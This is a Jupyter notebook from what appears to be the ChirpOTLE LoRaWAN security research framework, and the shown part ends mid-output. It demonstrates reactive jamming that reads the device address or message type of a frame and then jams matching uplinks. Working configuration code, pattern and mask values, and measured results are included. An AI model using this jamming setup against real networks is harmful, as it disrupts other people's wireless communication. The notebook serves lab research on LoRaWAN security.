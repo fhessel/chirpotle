{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "\n",
    "import matplotlib\n",
    "import matplotlib.pyplot as plt\n",
    "from IPython import display\n",
    "\n",
    "import time\n",
    "import traceback\n",
    "import random\n",
    "\n",
    "# Imports to access remote devices\n",
    "from chirpotle.context import tpy_from_context\n",
    "\n",
    "# Dissector, to create LoRaWAN payloads\n",
    "from chirpotle.dissect.base import (\n",
    "    DeviceSession,\n",
    "    MType)\n",
    "from chirpotle.dissect.v102 import (\n",
    "    LoRaWANMessage_V1_0_2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Reactive Jamming\n",
    "\n",
    "In this notebook, we continue our jamming experiments with the goal to attack only specific devices or message types. In LoRaWAN, this can be easily implemented, since most of the relevant fields are not encrypted. That allows reading a frame symbol by symbol until enough data is gathered decide whether the frame should be jammed or not.\n",
    "\n",
    "From an attacker's perspective, this technique facilitates hiding jamming activity, as the actions are very specific. From a security researchers perspective, using reactive jamming allows to limit attacks only to research devices, making experimentation easier without affecting operational networks. That is particularly important for LoRaWAN, since the great range prevents realistic experiments within a single, shielded lab.\n",
    "\n",
    "Our goal is to test the effectiveness of such a **reactive jammer**:\n",
    "- by offset of the data used for decision within the frame\n",
    "- by data rate\n",
    "\n",
    "## Background: Reactive Jamming\n",
    "\n",
    "To see how the reactive jammer works in LoRaWAN, let's have a look at the frame structure:\n",
    "\n",
    "```\n",
    "0    1                   5     6                                                              Offset\n",
    "+----+----+----+----+----+-----+ - - +----+----+----+ - - - - - - - - - +----+----+----+----+\n",
    "|MHDR|      DevAddr      |FCtrl|FOpts|   FCnt  |Port|      Payload      |        MIC        | Content\n",
    "+----+----+----+----+----+-----+ - - +----+----+----+ - - - - - - - - - +----+----+----+----+\n",
    "                                *****                *******************                      Encryption\n",
    "```\n",
    "\n",
    "The information about the message type is stored in the `MHDR` field directly at the beginning of the frame. The device address follows directly after. That means, the relevant information for most use cases is stored within the first five bytes of each frame.\n",
    "\n",
    "A LoRaWAN data frame has at least a length of 12 byte (no payload, meaning also no `Port`, and also no `FOpts`). An example of such a frame would be an ACK or the answer to an ADRAckReq. That leaves us with 12-5=7 byte of decision margin after the device address is transmitted.\n",
    "\n",
    "At this point it is important to note that there is no 1:1 correlation between payload bytes and symbol boundaries because of the spreading-factor-dependent bit/symbol ratio and the forward error correction. However, we will see that the 7 byte margin is always enough to jam LoRaWAN data frames."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Node Selection\n",
    "\n",
    "For the experiments in this notebook, we have node `alice` which transmits frames to node `bob`.\n",
    "\n",
    "A third node is the `jammer`. The jammer works most successful if it is close to the receiver (`bob` in this case), so that the SNR for a frame sent by the jammer is 6dB higher at `bob`, compared to `alice`'s valid frames.\n",
    "\n",
    "For more information on node configuration and troubleshooting, see the `01-tx-test` notebook.\n",
    "\n",
    "Later on, we will also add a node called `sniffer` that is close to node `alice`, which will try to receive the original frame, while it is jammed for the legitimate receiver. This again works due to the capture effect and the physical distance between nodes. While the reactive jamming experiments can be done in a single room, for jamming plus sniffing, a physical distance creating an attenuation of more than 6dB is required.\n",
    "\n",
    "The whole topology looks like this:\n",
    "\n",
    "```\n",
    "   ,---------,                                     ,---------,\n",
    "   | Sniffer |                                    /| Jammer  |\n",
    "   `---------´                                   / `---------´\n",
    "        ^ original frames                       /\n",
    "   ,---------,                                 /   ,---------,\n",
    "   | Alice   | -------- LoRaWAN messages -----*--> | Bob     |\n",
    "   `---------´         attenuation >6 dB           `---------´\n",
    "```\n",
    "\n",
    "`alice` and `sniffer`, as well as `bob` and `jammer` can be connected to the same ChirpOTLE hosts. We use ChirpOTLE nodes for all of the devices, since that facilitates experimentation. Alice and bob can be replaced by a LoRaWAN end device and gateway, respectively."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You are running TPyControl in version 0.0.0\n",
      "Connected to 2 remote nodes\n",
      "\n",
      "node    host               proxy                                 modules (name[:type])\n",
      "------  -----------------  ------------------------------------  -----------------------\n",
      "alice   loranode1.example  PYRO:tpynode@loranode1.example:42337  lopy4:LoRa feather:LoRa\n",
      "bob     loranode2.example  PYRO:tpynode@loranode2.example:42337  hat:LoRa lopy4:LoRa\n"
     ]
    }
   ],
   "source": [
    "tc, devices = tpy_from_context()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the list above we see the available modules. On node `alice` there is a single node `lora`, on node `bob` we have the node `lora` (will be the legitimate receiver) and `jammer` which will be our attacker node."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Transmitting node\n",
    "alice  = tc.nodes['alice']['lopy4']\n",
    "\n",
    "# Receiving node\n",
    "bob    = tc.nodes['bob']['hat']\n",
    "\n",
    "# Jammer (close to the receiver)\n",
    "jammer = tc.nodes['bob']['lopy4']\n",
    "\n",
    "# We will assign the sniffer node later, so that all other experiments can run without it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Channel Configuration\n",
    "\n",
    "Here we configure the channel that we will use. The settings below match the EU868 region of LoRaWAN. Note that frequency, bandwidth and spreadingfactor will be overidden during the experiment.\n",
    "\n",
    "The `invertiq` IQ settings are the same for all nodes. With the configuration below, the nodes expect incoming frames with the same polarity as they transmit it. For the jammer, this means it will transmit jamming frames in the same polarity. It is important for the jammer to use the same polarity as the jammed signal, as otherwise performance will degrade notably."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'frequency': 869524963,\n",
       " 'bandwidth': 125,\n",
       " 'spreadingfactor': 12,\n",
       " 'syncword': 18,\n",
       " 'codingrate': 5,\n",
       " 'invertiqtx': True,\n",
       " 'invertiqrx': False,\n",
       " 'explicitheader': True}"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "channel = {\n",
    "    'frequency': 869525000,\n",
    "    'bandwidth': 125,\n",
    "    'spreadingfactor': 12,\n",
    "    'syncword': 18,\n",
    "    'codingrate': 5,\n",
    "    'invertiqtx': True,\n",
    "    'invertiqrx': False,\n",
    "    'explicitheader': True,\n",
    "}\n",
    "\n",
    "alice.set_lora_channel(**channel)\n",
    "bob.set_lora_channel(**channel)\n",
    "jammer.set_lora_channel(**channel)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Test Data\n",
    "\n",
    "We now create three valid LoRaWAN frames which can be used for our experiments with reactive jamming.\n",
    "\n",
    "We use the fictional `0xDEADBEEF` (little endian) device as _our_ device, which we want to/are allowed to jam. The second device with the `0xCOFEBABE` (little endian) device address should not be affected by our jammer.\n",
    "\n",
    "The `chirpotle.dissect` module helps with creating the frame structures and device meta data:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create a device session with some random keys for \"our\" device\n",
    "ourDeviceSession = DeviceSession(\n",
    "    fCntUp = 42,\n",
    "    fCntDown = 23,\n",
    "    appSKey = list(range(16)),\n",
    "    nwkSKey = list(range(16)),\n",
    "    devAddr = [0xEF, 0xBE, 0xAD, 0xDE])\n",
    "\n",
    "# Create another device session for another device, which we don't want to jam\n",
    "otherDeviceSession = DeviceSession(\n",
    "    fCntUp = 300,\n",
    "    fCntDown = 5,\n",
    "    appSKey = list(range(16)),\n",
    "    nwkSKey = list(range(16)),\n",
    "    devAddr = [0xBE, 0xBA, 0xFE, 0xC0])\n",
    "\n",
    "# A confirmed data uplink from our device\n",
    "confirmed_uplink = LoRaWANMessage_V1_0_2(session=ourDeviceSession)\n",
    "# Set the message type first to access other attributes\n",
    "confirmed_uplink.mhdr.mType = MType.CONF_DATA_UP\n",
    "# It is important to set all fields that have an impact on the keystream before\n",
    "# setting the payload, because when setting frmPayload, it will be directly encrypted\n",
    "# using the current values. So devAddr and frame counter and port (which decides the\n",
    "# key) go first:\n",
    "confirmed_uplink.payload.fhdr.devAddr = ourDeviceSession.devAddr\n",
    "confirmed_uplink.payload.port = 1\n",
    "confirmed_uplink.payload.fhdr.fCnt = ourDeviceSession.fCntUp\n",
    "# Set one byte payload. Could be a sensor value or an alarm flag:\n",
    "confirmed_uplink.payload.frmPayload = [0x42]\n",
    "confirmed_uplink.payload.updateMIC()\n",
    "\n",
    "# In a similar way, we create an unconfirmed frame from our device\n",
    "unconfirmed_uplink = LoRaWANMessage_V1_0_2(session=ourDeviceSession)\n",
    "unconfirmed_uplink.mhdr.mType = MType.UNCONF_DATA_UP\n",
    "unconfirmed_uplink.payload.fhdr.devAddr = ourDeviceSession.devAddr\n",
    "unconfirmed_uplink.payload.port = 1\n",
    "unconfirmed_uplink.payload.fhdr.fCnt = ourDeviceSession.fCntUp\n",
    "unconfirmed_uplink.payload.frmPayload = [0x12]\n",
    "unconfirmed_uplink.payload.updateMIC()\n",
    "\n",
    "# And another unconfirmed frame for the other device\n",
    "other_uplink = LoRaWANMessage_V1_0_2(session=otherDeviceSession)\n",
    "other_uplink.mhdr.mType = MType.UNCONF_DATA_UP\n",
    "other_uplink.payload.fhdr.devAddr = otherDeviceSession.devAddr\n",
    "other_uplink.payload.port = 1\n",
    "other_uplink.payload.fhdr.fCnt = otherDeviceSession.fCntUp\n",
    "other_uplink.payload.frmPayload = [0x12]\n",
    "other_uplink.payload.updateMIC()\n",
    "\n",
    "# Small helper functio to print raw frame and dissector output:\n",
    "def printframe(frame, title):\n",
    "    print(title)\n",
    "    print(\"Raw:\", \" \".join(\"%02x\" % b for b in frame[:]))\n",
    "    print(\"Length:\", len(frame), \"bytes\")\n",
    "    print(frame.print(2))\n",
    "    print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, we will use the integrated dissector to show information about the frame. This is not required, but will help understanding where to find the values for the jamming decision later on.\n",
    "\n",
    "First, we have an uplink frame of the `CONF_DATA_UP` type, meaning it requires an `ACK` by the network server. Note how the DevAddr is encoded in little endian byte order from bytes 2 to 5 in the raw output: `de ad be ef`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frame 1: Confirmed Uplink by our Device\n",
      "Raw: 80 de ad be ef 00 2a 00 01 40 ab b6 d7 6a\n",
      "Length: 14 bytes\n",
      "  LoRaWAN Message:\n",
      "    MHDR:\n",
      "      Message Type: CONF_DATA_UP\n",
      "      LoRaWAN Major Version: 1.x\n",
      "    Payload:\n",
      "      FHDR:\n",
      "        DevAddr: ef be ad de\n",
      "        FCnt: 42\n",
      "        FCtrl: 00000000\n",
      "               0....... ADR: No ADR\n",
      "               .0...... ADRACKREQ: No ADR ACK request\n",
      "               ..0..... ACK: No ACK\n",
      "               ...0.... Class: No Class B\n",
      "               ....0000 FOptsLen: 0\n",
      "        FOpts: ... (0 byte(s))\n",
      "      Port: 1\n",
      "      Application Payload:\n",
      "        42\n",
      "      As text:\n",
      "        B\n",
      "      MIC: ab b6 d7 6a (verified)\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "printframe(confirmed_uplink, \"Frame 1: Confirmed Uplink by our Device\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The second frame is also from our device, but this time as `UNCONF_DATA_UP`, so that we can learn how to do jamming based on the message type.\n",
    "\n",
    "Note how the first byte of the raw frame differs, with `0x80` for confirmed uplink messages and `0x40` for unconfirmed traffic."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frame 2: Unconfirmed Uplink by our Device\n",
      "Raw: 40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
      "Length: 14 bytes\n",
      "  LoRaWAN Message:\n",
      "    MHDR:\n",
      "      Message Type: UNCONF_DATA_UP\n",
      "      LoRaWAN Major Version: 1.x\n",
      "    Payload:\n",
      "      FHDR:\n",
      "        DevAddr: ef be ad de\n",
      "        FCnt: 42\n",
      "        FCtrl: 00000000\n",
      "               0....... ADR: No ADR\n",
      "               .0...... ADRACKREQ: No ADR ACK request\n",
      "               ..0..... ACK: No ACK\n",
      "               ...0.... Class: No Class B\n",
      "               ....0000 FOptsLen: 0\n",
      "        FOpts: ... (0 byte(s))\n",
      "      Port: 1\n",
      "      Application Payload:\n",
      "        12\n",
      "      MIC: 30 af 2d 0d (verified)\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "printframe(unconfirmed_uplink, \"Frame 2: Unconfirmed Uplink by our Device\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lastly, we have a frame by the other device to show how its communication is completely unaffected even with the jammer being present and active. If you compare this raw frame to the second frame, it differs in bytes 2 to 5, which encode the device address. Other bytes might differ as well, but don't help in differentiating the devices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frame 3: Unconfirmed Uplink by the other Device\n",
      "Raw: 40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "Length: 14 bytes\n",
      "  LoRaWAN Message:\n",
      "    MHDR:\n",
      "      Message Type: UNCONF_DATA_UP\n",
      "      LoRaWAN Major Version: 1.x\n",
      "    Payload:\n",
      "      FHDR:\n",
      "        DevAddr: be ba fe c0\n",
      "        FCnt: 300\n",
      "        FCtrl: 00000000\n",
      "               0....... ADR: No ADR\n",
      "               .0...... ADRACKREQ: No ADR ACK request\n",
      "               ..0..... ACK: No ACK\n",
      "               ...0.... Class: No Class B\n",
      "               ....0000 FOptsLen: 0\n",
      "        FOpts: ... (0 byte(s))\n",
      "      Port: 1\n",
      "      Application Payload:\n",
      "        12\n",
      "      MIC: 6d ec 49 d0 (verified)\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "printframe(other_uplink, \"Frame 3: Unconfirmed Uplink by the other Device\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Jamming by Device Address\n",
    "\n",
    "First we will try jamming based on the device address. Therefore, Alice will send all three test frames to Bob. The jammer will match device address `0xDEADBEEF`, so only the one frame for the other device (`0xCOFEBABE`) is expected to be received by Bob.\n",
    "\n",
    "First, we configure Bob to listen:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# setting the channel again is not required if you execute the code top to bottom,\n",
    "# but might be helpful if you re-run single experiments.\n",
    "bob.set_lora_channel(**channel)\n",
    "bob.receive()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "> **Note:** Each device has a small buffer for incoming messages, so they don't need to be fetched directly. However, if the buffer is full, further incoming messages will be dropped. The buffer is also emptied when running commands that change the operational mode of the device, like `standby()` or `transmit_frame()`. So make sure to execute the steps in this section directly after each other if you face unexpected results.\n",
    "\n",
    "Next, we configure the jammer. With jamming decisions being time critical, they have to be made on the devices as quickly as possible. Therefore, we define a _payload pattern_ and a _payload mask_. The pattern defines how a payload must look like if it should be jammed. As we are only interested in a part of the frame, the device address in this case, the mask defines which bits of the payload are compared.\n",
    "\n",
    "Therefore, we set the values as follows:\n",
    "\n",
    "```\n",
    "Payload: MHDR | DevAddr     | FCtrl | ...\n",
    "Value:   80   | DE AD BE EF | 00    | ...\n",
    "Pattern: 00   | DE AD BE EF\n",
    "Mask:    00   | FF FF FF FF\n",
    "```\n",
    "\n",
    "The pattern and mask can be shorter than the actual frame length, but they have to be of the same size. For each bit that is set in the mask, the device will compare value and pattern, and if they match, the jammer will be activated.\n",
    "\n",
    "Setting up the jammer is done this way:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "jammer.set_lora_channel(**channel)\n",
    "\n",
    "# Configure the payload length used for jamming.\n",
    "# The jammer uses a normal LoRa frame, so this is the length *after* preamble and PHYHDR\n",
    "jammer.set_jammer_payload_length(4)\n",
    "# Set the preamble length to the default length\n",
    "jammer.set_preamble_length(8)\n",
    "# Do not add a CRC on MAC layer\n",
    "jammer.set_txcrc(False)\n",
    "\n",
    "# Specify jammer settings:\n",
    "# network byte order, with leading 0x00 for MHDR\n",
    "pattern = [0x00, 0xDE, 0xAD, 0xBE, 0xEF]\n",
    "# only look at bytes 2..5\n",
    "mask = [0x00, 0xFF, 0xFF, 0xFF, 0xFF]\n",
    "\n",
    "# Actually enable the sniffer by passing pattern and mask to it.\n",
    "jammer.enable_sniffer(action='internal', # Trigger jammer on the same device (see note below)\n",
    "                      pattern=pattern,\n",
    "                      mask=mask)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "> **Note:** The jammer will **stay active** and jam every frame. If you run `enable_sniffer(action='internal')` without pattern and mask, that will DoS the currently selected channel also for other networks and devices, so be careful what you are doing. To turn it off, you explicitly need to call `jammer.standby()`.\n",
    "\n",
    "> **Note:** The `action='internal'` parameter specifies that the trigger for jamming should be handled internally on the same node. We tried connecting multiple MCUs running our firmware, an MCU with multiple LoRa transceivers, and even remote triggering via UDP (using two ESP32-based LoPy4s), but none of these approaches reached an equally well performance (latency-wise) than just flipping the same LoRa transceiver into tx mode for jamming. Setting `action='internal'` is a remnant of these experiments, but other values (like `gpio` or `udp`) are not recommended. \n",
    "\n",
    "> **Note:** When dealing with uplink and downlink frames, you have to be careful with **polarity**. In LoRaWAN, uplink frames are sent with a different polarity than downlink frames. Also, jamming a frame is only effective, if the tx polarity of the jammer is matching the polarity of the message that should be jammed. In this sheet, we only consider uplink frames, therefore, we do not have to care about that.\n",
    "\n",
    "Now, we let alice send the frames, each with a short pause in between. After the experiment, we collect the frames that arrived at bob."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frames in bob's buffer: 3\n"
     ]
    }
   ],
   "source": [
    "alice.set_lora_channel(**channel)\n",
    "\n",
    "# Frame 1: Confirmed Uplink for our device\n",
    "# → We expect this to be jammed\n",
    "alice.transmit_frame(confirmed_uplink.raw, blocking = True)\n",
    "time.sleep(3)\n",
    "\n",
    "# Frame 2: Unconfirmed Uplink for our device\n",
    "# → We expect this to be jammed\n",
    "alice.transmit_frame(unconfirmed_uplink.raw, blocking = True)\n",
    "time.sleep(3)\n",
    "\n",
    "# Frame 3: Unconfirmed Uplink for other device\n",
    "# → We expect this frame to arrive\n",
    "alice.transmit_frame(other_uplink.raw, blocking = True)\n",
    "time.sleep(3)\n",
    "\n",
    "# Deactivate jammer (be nice to other people)\n",
    "jammer.standby()\n",
    "\n",
    "# Collect received frames from bob:\n",
    "bob_frames = []\n",
    "frm = bob.fetch_frame()\n",
    "while frm is not None:\n",
    "    bob_frames.append(frm)\n",
    "    frm = bob.fetch_frame()\n",
    "bob.standby()\n",
    "print(\"Frames in bob's buffer: %d\" % len(bob_frames))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since the jammer reads parts of the payload before triggering, it cannot prevent the legitimate frame from being detected at the receiver as well (in fact, the jammer is a plain LoRa transceiver, so it also needs to perform frame detection before even starting to demodulate any payload). For that reason, we expect bob to **receive three frames**. If you see more frames when running the experiment, chances are that you have LoRaWAN end devices near you. If you see less or none, try increasing the spreading factor in the channel definition in the setup section.\n",
    "\n",
    "LoRa can use a CRC on the physical layer, but the ChirpOTLE companion application is configured to ignore PHY CRC failure, so that you get data and information about frame times, even if the payload is partly scrambled.\n",
    "\n",
    "To see what has been received, we print payload and meta data for each frame:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bob_frames[0] = 80 de ad be ef 00 2a 00 0a 17 7c 24 30 78\n",
      "   RSSI: -62 dBm   SNR: -22 dB\n",
      "bob_frames[1] = 40 de ad be ef 00 2a 00 09 12 7c 21 35 7c\n",
      "   RSSI: -63 dBm   SNR: -23 dB\n",
      "bob_frames[2] = 40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "   RSSI: -81 dBm   SNR: -21 dB\n"
     ]
    }
   ],
   "source": [
    "for idx, bob_frame in enumerate(bob_frames):\n",
    "    print(f\"bob_frames[{idx:1}] = {' '.join('%02x' % d for d in bob_frame['payload'])}\")\n",
    "    print(f\"   RSSI: {bob_frame['rssi']:3} dBm   SNR: {bob_frame['snr']:3} dB\" )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To analyse the effect of the jammer, please use the output above to match the received frames to the true sample frames that were created before:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Matching of frames is done by hand, so you can adapt if other frames have been received.\n",
    "# If a certain frame has not been received, just ignore it by setting it to None\n",
    "\n",
    "# Confirmed uplink for our device, should start with 80 de ad be ef\n",
    "rx_addr_confirmed_uplink = bob_frames[0]['payload']\n",
    "\n",
    "# Unconfirmed uplink for our device, should start with 40 de ad be ef\n",
    "rx_addr_unconfirmed_uplink = bob_frames[1]['payload']\n",
    "\n",
    "# Unconfirmed uplink for the other device, should start with 40 co fe ba be\n",
    "rx_addr_other_uplink = bob_frames[2]['payload']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We define a function that compares two frames nibble by nibble and run it for alice's transmitted frames and bob's recived frames:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frame 1: Confirmed uplink from our device:\n",
      "Transmitted: 80 de ad be ef 00 2a 00 01 40 ab b6 d7 6a\n",
      "Received:    80 de ad be ef 00 2a 00 0a 17 7c 24 30 78\n",
      "Jammer Mask:    ** ** ** **\n",
      "Jammed:                               * ** ** ** ** **\n",
      "\n",
      "Frame 2: Unconfirmed uplink from our device:\n",
      "Transmitted: 40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
      "Received:    40 de ad be ef 00 2a 00 09 12 7c 21 35 7c\n",
      "Jammer Mask:    ** ** ** **\n",
      "Jammed:                               *  * ** ** ** **\n",
      "\n",
      "Frame 3: Unconfirmed uplink from other device:\n",
      "Transmitted: 40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "Received:    40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "Jammer Mask:    ** ** ** **\n",
      "Jammed:                                               \n"
     ]
    }
   ],
   "source": [
    "def compare_frames(tx_frame, rx_frame, mask=None):\n",
    "    def compare_byte(t, r):\n",
    "        return (\" \" if t&0xf0 == r&0xf0 else \"*\") + (\" \" if t&0xf == r&0xf else \"*\")\n",
    "    print(\"Transmitted:\", \" \".join(\"%02x\" % d for d in tx_frame))\n",
    "    print(\"Received:   \", \" \".join(\"%02x\" % d for d in rx_frame))\n",
    "    if mask is not None:\n",
    "        print(\"Jammer Mask:\", \" \".join(compare_byte(0,m) for m in mask))\n",
    "    print(\"Jammed:     \", \" \".join(compare_byte(t,r) for t,r in zip(tx_frame, rx_frame)))\n",
    "    \n",
    "# Use the function to print the received frames:\n",
    "if rx_addr_confirmed_uplink is not None:\n",
    "    print(\"Frame 1: Confirmed uplink from our device:\")\n",
    "    compare_frames(confirmed_uplink.raw, rx_addr_confirmed_uplink, mask)\n",
    "    print()\n",
    "if rx_addr_unconfirmed_uplink is not None:\n",
    "    print(\"Frame 2: Unconfirmed uplink from our device:\")\n",
    "    compare_frames(unconfirmed_uplink.raw, rx_addr_unconfirmed_uplink, mask)\n",
    "    print()\n",
    "if rx_addr_other_uplink is not None:\n",
    "    print(\"Frame 3: Unconfirmed uplink from other device:\")\n",
    "    compare_frames(other_uplink.raw, rx_addr_other_uplink, mask)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the output above, we learn that the reactive jammer needs some time between observing the matching pattern and starting the jamming. There are mainly two factors determining how long it will take before jamming starts:\n",
    "\n",
    "- The spreading factor, bandwidth, and coding rate used by the transmitter, since they define how may raw bits make up a symbol, and how symbols map to payload bytes\n",
    "- The rx/tx switch and tx ramp-up time of the transceiver\n",
    "\n",
    "Interestingly, the delay seems to be comparable for all data rates if it is measured in payload length between end of pattern and start of interference.\n",
    "\n",
    "Also note that the third frame is completely unaffected by the jammer, even though the jammer was active."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Jamming by Message Type\n",
    "\n",
    "While the device address is the most obvious target for jamming, some higher layer attacks may need additional fields to be selected. Examples could be the _ACK Spoofing Attack_, first proposed by [Yang](https://repository.tudelft.nl/islandora/object/uuid:87730790-6166-4424-9d82-8fe815733f1e), which needs jamming of confirmed traffic (meaning selection based on the MType field in MHDR) or attacks on adaptive data rate, like [our ADR Spoofing](https://dl.acm.org/doi/10.1145/3395351.3399423), which could benefit from checking the ADRAckReq flag in the FCtrl field.\n",
    "\n",
    "Here, we implement jamming of confirmed messages. For that, we can use a similar setup as in the previous attack, and only slightly modify the mask and pattern. For this demonstration, we still include the device address to not affect other networks:\n",
    "\n",
    "```\n",
    "Payload: MHDR | DevAddr     | FCtrl | ...\n",
    "Pattern: 80   | DE AD BE EF\n",
    "Mask:    E0   | FF FF FF FF\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "pattern = [0x80, 0xDE, 0xAD, 0xBE, 0xEF]\n",
    "mask = [0xE0, 0xFF, 0xFF, 0xFF, 0xFF]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We run the same experiment from above:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Enable receiver\n",
    "bob.set_lora_channel(**channel)\n",
    "bob.receive()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Configure and activate jammer\n",
    "jammer.set_lora_channel(**channel)\n",
    "jammer.set_jammer_payload_length(4)\n",
    "jammer.set_preamble_length(8)\n",
    "jammer.set_txcrc(False)\n",
    "jammer.enable_sniffer(action='internal', pattern=pattern, mask=mask)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frames in bob's buffer: 3\n",
      "bob_frames[0] = 80 de ad be ef 00 2a 00 09 2e 4f b4 33 7a\n",
      "   RSSI: -63 dBm   SNR: -23 dB\n",
      "bob_frames[1] = 40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
      "   RSSI: -80 dBm   SNR: -20 dB\n",
      "bob_frames[2] = 40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "   RSSI: -80 dBm   SNR: -20 dB\n"
     ]
    }
   ],
   "source": [
    "# Transmit frames and collect received frame data\n",
    "alice.set_lora_channel(**channel)\n",
    "alice.transmit_frame(confirmed_uplink.raw, blocking = True)\n",
    "time.sleep(3)\n",
    "alice.transmit_frame(unconfirmed_uplink.raw, blocking = True)\n",
    "time.sleep(3)\n",
    "alice.transmit_frame(other_uplink.raw, blocking = True)\n",
    "time.sleep(3)\n",
    "jammer.standby()\n",
    "\n",
    "bob_frames = []\n",
    "frm = bob.fetch_frame()\n",
    "while frm is not None:\n",
    "    bob_frames.append(frm)\n",
    "    frm = bob.fetch_frame()\n",
    "bob.standby()\n",
    "print(\"Frames in bob's buffer: %d\" % len(bob_frames))\n",
    "for idx, bob_frame in enumerate(bob_frames):\n",
    "    print(f\"bob_frames[{idx:1}] = {' '.join('%02x' % d for d in bob_frame['payload'])}\")\n",
    "    print(f\"   RSSI: {bob_frame['rssi']:3} dBm   SNR: {bob_frame['snr']:3} dB\" )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Again, we need to match received frames and expected frames, then we display the result:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Frame 1: Confirmed uplink from our device:\n",
      "Transmitted: 80 de ad be ef 00 2a 00 01 40 ab b6 d7 6a\n",
      "Received:    80 de ad be ef 00 2a 00 09 2e 4f b4 33 7a\n",
      "Jammer Mask: *  ** ** ** **\n",
      "Jammed:                               * ** **  * ** * \n",
      "\n",
      "Frame 2: Unconfirmed uplink from our device:\n",
      "Transmitted: 40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
      "Received:    40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
      "Jammer Mask: *  ** ** ** **\n",
